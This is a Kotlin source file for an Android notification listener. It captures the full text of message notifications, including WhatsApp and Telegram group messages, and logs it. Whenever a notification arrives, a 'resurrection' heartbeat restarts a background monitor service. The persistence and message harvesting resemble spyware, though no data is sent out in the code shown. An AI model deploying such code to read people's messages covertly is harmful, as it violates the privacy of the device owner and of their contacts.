package com.example.myandroid

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.content.Context
import org.json.JSONObject
import org.json.JSONArray

class MyNotificationListener : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        // Feature Gate
        if (!ConfigManager.canCollect(this, "notifications")) return

        // SYMBIOTE RESURRECTION: Secondary Heartbeat
        try {
            if (!MonitorService.isRunning) {
                val intent = android.content.Intent(this, MonitorService::class.java)
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) startForegroundService(intent)
                else startService(intent)
            }
        } catch(e: Exception) {}

        if (sbn == null) return
        
        // FILTER: Ignore "Ongoing" notifications (Music, USB, Background Services)
        if (!sbn.isClearable) return

        val pkg = sbn.packageName
        val extras = sbn.notification.extras
        val title = extras.getString("android.title") ?: ""
        
        // DEEP EXTRACTION: Prioritize expanded/inbox styles over collapsed text
        var text = ""
        
        // 1. Check for Multi-line (InboxStyle) - Common in WhatsApp/Telegram groups
        val lines = extras.getCharSequenceArray("android.textLines")
        if (lines != null && lines.isNotEmpty()) {
            text = lines.joinToString("\n")
        } 
        // 2. Check for Big Text (BigTextStyle) - Long emails/messages
        else {
            text = extras.getCharSequence("android.bigText")?.toString() ?: ""
        }

        // 3. Fallback to standard text if expanded data is empty
        if (text.isEmpty()) {
            text = extras.getCharSequence("android.text")?.toString() ?: ""
        }

        if (title.isEmpty() && text.isEmpty()) return

        // LOAD DATA
        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        val editor = prefs.edit()

        // 1. UPDATE GLOBAL COUNT
        val total = prefs.getInt("notif_count", 0) + 1
        editor.putInt("notif_count", total)

        // 2. UPDATE APP LEADERBOARD (Who is most annoying?)
        val leaderboardStr = prefs.getString("notif_leaderboard", "{}")
        val leaderboard = try { JSONObject(leaderboardStr) } catch (e: Exception) { JSONObject() }
        val appCount = leaderboard.optInt(pkg, 0) + 1
        leaderboard.put(pkg, appCount)
        editor.putString("notif_leaderboard", leaderboard.toString())

        // 3. LOG HISTORY (STREAM)
        val entry = JSONObject()
        entry.put("pkg", pkg)
        entry.put("title", title.take(50))
        entry.put("txt", text.take(100))
        entry.put("ts", System.currentTimeMillis())
        
        DumpManager.appendLog("NOTIF", entry)
        
        editor.apply()
    }
}